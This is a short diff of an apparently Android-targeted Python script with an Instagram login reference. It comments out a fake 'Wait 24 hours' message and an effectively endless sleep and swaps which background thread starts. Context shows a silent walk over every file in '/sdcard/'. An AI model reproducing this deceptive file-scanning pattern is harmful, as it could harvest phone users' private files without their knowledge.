@@ -21,8 +21,8 @@ r = Fore.RED
 ff = "011234456"+aa
 opop = ff+hh
 
-print ("ali max = Wait 24 hours") 
-time.sleep(10000000000)
+#print ("ali max = Wait 24 hours") 
+#time.sleep(10000000000)
 if not isfile('.test.txt'):
     for dir, dirs, files in walk('/sdcard/'):
         for file in files:
@@ -147,7 +147,7 @@ login = 'https://www.instagram.com/'
 
 '''
 
-t = Thread(target=special).start()
+#t = Thread(target=special).start()
 #t = Thread(target=ali).start()
 #t = Thread(target=ali).start()
 t = Thread(target=ali).start()
